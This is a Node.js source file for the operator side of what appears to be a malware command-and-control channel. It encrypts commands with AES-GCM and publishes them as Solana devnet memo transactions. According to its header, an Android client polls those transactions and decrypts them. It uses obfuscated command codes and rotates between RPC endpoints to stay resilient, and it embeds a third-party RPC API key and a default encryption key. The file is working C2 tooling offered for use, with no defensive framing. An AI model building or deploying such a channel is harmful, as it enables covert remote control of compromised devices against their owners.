/**
 * Blockchain Command Channel Operator - Solana Devnet (PYUSD-style)
 *
 * Sends encrypted commands to a Solana "channel" account by emitting a memo.
 * The Android client should poll memo instructions involving the channel
 * address and decrypt payloads that start with "CMD:".
 *
 * Usage:
 *   node blockchain-operator.js <command> [jsonData]
 *
 * Examples:
 *   node blockchain-operator.js x0000di
 *   node blockchain-operator.js x0000mc "{\"sec\":5}"
 *
 * Environment:
 *   BLOCKCHAIN_RPC_URL=https://api.devnet.solana.com
 *   BLOCKCHAIN_CONTRACT_ADDRESS=<channel pubkey> (base58)
 *   BLOCKCHAIN_PRIVATE_KEY=<operator secret key base58>
 *   BLOCKCHAIN_C2_AES_KEY=<64 hex chars>
 */

const crypto = require('crypto');
const bs58Mod = require('bs58');
const fs = require('fs');
const path = require('path');
const {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  LAMPORTS_PER_SOL,
  sendAndConfirmTransaction
} = require('@solana/web3.js');

const bs58 = bs58Mod.default || bs58Mod;
const { encode: b58encode, decode: b58decode } = bs58;

const repoRoot = path.resolve(__dirname, '..', '..');
const keysEnvPath = path.join(repoRoot, '.blockchain-keys.env');
const contractEnvPath = path.join(repoRoot, '.blockchain-contract.env');
const configPath = path.join(repoRoot, 'config', 'blockchain_c2.json');

function parseEnvFile(filePath) {
  if (!fs.existsSync(filePath)) return {};
  return fs.readFileSync(filePath, 'utf8')
    .split(/\r?\n/)
    .reduce((acc, line) => {
      const match = line.trim().match(/^([^=#]+)=(.*)$/);
      if (match) {
        acc[match[1].trim()] = match[2].trim();
      }
      return acc;
    }, {});
}

function loadEnv() {
  const env = {
    ...parseEnvFile(keysEnvPath),
    ...parseEnvFile(contractEnvPath),
    ...process.env
  };
  if (fs.existsSync(configPath)) {
    try {
      const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
      if (config.rpc_url) {
        env.BLOCKCHAIN_RPC_URL = env.BLOCKCHAIN_RPC_URL || config.rpc_url;
        env.SOLANA_RPC_URL = env.SOLANA_RPC_URL || config.rpc_url;
      }
      if (config.contract_address) {
        env.BLOCKCHAIN_CONTRACT_ADDRESS = env.BLOCKCHAIN_CONTRACT_ADDRESS || config.contract_address;
        env.SOLANA_CHANNEL_ADDRESS = env.SOLANA_CHANNEL_ADDRESS || config.contract_address;
      }
      if (config.aes_key_env && process.env[config.aes_key_env]) {
        env.BLOCKCHAIN_C2_AES_KEY = process.env[config.aes_key_env];
      }
    } catch (e) {
      console.warn('[blockchain-operator] Failed to parse config:', e.message);
    }
  }
  // Ensure existing process.env values take precedence
  Object.assign(process.env, env);
  return env;
}

const loadedEnv = loadEnv();
const RPC_CANDIDATES = [
  loadedEnv.BLOCKCHAIN_RPC_URL,
  loadedEnv.SOLANA_RPC_URL,
  'https://api.devnet.solana.com',
  'https://api.testnet.solana.com',
  'https://rpc.ankr.com/solana_devnet',
  'https://devnet.helius-rpc.com/?api-key=288d548c-1be7-4db4-86c3-60300d282efa'
].filter(Boolean).filter((url, index, self) => self.indexOf(url) === index && !url.includes('alchemy'));

const CHANNEL_ADDRESS = loadedEnv.SOLANA_CHANNEL_ADDRESS || loadedEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
const PRIVATE_KEY_B58 = loadedEnv.SOLANA_OPERATOR_PRIVATE_KEY || loadedEnv.BLOCKCHAIN_PRIVATE_KEY;
const AES_KEY_HEX = loadedEnv.BLOCKCHAIN_C2_AES_KEY || '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';

const MEMO_PROGRAM_ID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');

let rpcCursor = 0;

function loadKeypair(secret) {
  if (!secret) {
    throw new Error('Missing operator secret key (BLOCKCHAIN_PRIVATE_KEY / SOLANA_OPERATOR_PRIVATE_KEY)');
  }
  const decoded = b58decode(secret);
  if (decoded.length !== 64) {
    throw new Error('Solana secret key must be base58-encoded 64 bytes');
  }
  return Keypair.fromSecretKey(decoded);
}

function encryptCommand(plaintext, keyHex) {
  const key = Buffer.from(keyHex, 'hex');
  if (key.length !== 32) {
    throw new Error('AES key must be 32 bytes (64 hex chars)');
  }
  const nonce = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
  const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([nonce, encrypted, tag]); // hex later
}

async function getHealthyConnection(startIndex = 0) {
  let lastErr;
  for (let i = 0; i < RPC_CANDIDATES.length; i++) {
    const idx = (startIndex + i) % RPC_CANDIDATES.length;
    const rpc = RPC_CANDIDATES[idx];
    try {
      const conn = new Connection(rpc, 'confirmed');
      await conn.getLatestBlockhash('confirmed');
      return { conn, rpc, idx };
    } catch (err) {
      lastErr = err;
    }
  }
  throw lastErr || new Error('No RPC endpoint available');
}

async function ensureBalance(connection, pubkey, minSol = 0.1) {
  const balance = await connection.getBalance(pubkey, 'confirmed');
  if (balance / LAMPORTS_PER_SOL >= minSol) {
    return;
  }
  // Best effort airdrop on devnet
  try {
    const sig = await connection.requestAirdrop(pubkey, Math.ceil(minSol * LAMPORTS_PER_SOL));
    await connection.confirmTransaction(sig, 'confirmed');
  } catch {
    // continue - user can fund manually
  }
}

async function sendCommand(command, data = {}) {
  if (!CHANNEL_ADDRESS) {
    throw new Error('Missing CHANNEL_ADDRESS (SOLANA_CHANNEL_ADDRESS/BLOCKCHAIN_CONTRACT_ADDRESS)');
  }
  const payer = loadKeypair(PRIVATE_KEY_B58);
  const channel = new PublicKey(CHANNEL_ADDRESS);

  let lastErr;
  for (let attempt = 0; attempt < RPC_CANDIDATES.length; attempt++) {
    try {
      const { conn: connection, rpc, idx } = await getHealthyConnection((rpcCursor + attempt) % RPC_CANDIDATES.length);
      console.log(`Attempting RPC ${rpc} (attempt ${attempt + 1})`);
      await ensureBalance(connection, payer.publicKey, 0.05);

      const payload = {
        action: command,
        data,
        timestamp: Date.now()
      };
      const plaintext = JSON.stringify(payload);
      const encrypted = encryptCommand(plaintext, AES_KEY_HEX).toString('hex');
      const memoText = `CMD:${encrypted}`;

      const tx = new Transaction();
      tx.add(
        SystemProgram.transfer({
          fromPubkey: payer.publicKey,
          toPubkey: channel,
          lamports: 1 // keeps channel in account keys for polling
        })
      );
      tx.add(
        new TransactionInstruction({
          keys: [{ pubkey: payer.publicKey, isSigner: true, isWritable: true }],
          programId: MEMO_PROGRAM_ID,
          data: Buffer.from(memoText, 'utf8')
        })
      );

      const sig = await sendAndConfirmTransaction(connection, tx, [payer], {
        commitment: 'confirmed',
        skipPreflight: true,
        maxRetries: 3
      });

      rpcCursor = idx;
      console.log('Command sent');
      console.log('  RPC     :', rpc);
      console.log('  Channel :', channel.toBase58());
      console.log('  Signer  :', payer.publicKey.toBase58());
      console.log('  Tx sig  :', sig);
      return {
        txSig: sig,
        rpc,
        channel: channel.toBase58(),
        signer: payer.publicKey.toBase58(),
        memo: memoText,
        payload
      };
    } catch (err) {
      lastErr = err;
      console.warn(`Send attempt ${attempt + 1} failed: ${err.message || err}`);
    }
  }

  throw lastErr || new Error('All RPC attempts failed');
}

async function main() {
  const [action, rawData] = process.argv.slice(2);
  if (!action) {
    console.error('Usage: node blockchain-operator.js <command> [jsonData]');
    process.exit(1);
  }

  let data = {};
  if (rawData) {
    try {
      data = JSON.parse(rawData);
    } catch {
      console.warn('Could not parse JSON data; sending empty object.');
    }
  }

  await sendCommand(action, data);
}

if (require.main === module) {
  main().catch((err) => {
    console.error('Send failed:', err.message || err);
    process.exit(1);
  });
}

module.exports = { sendCommand };
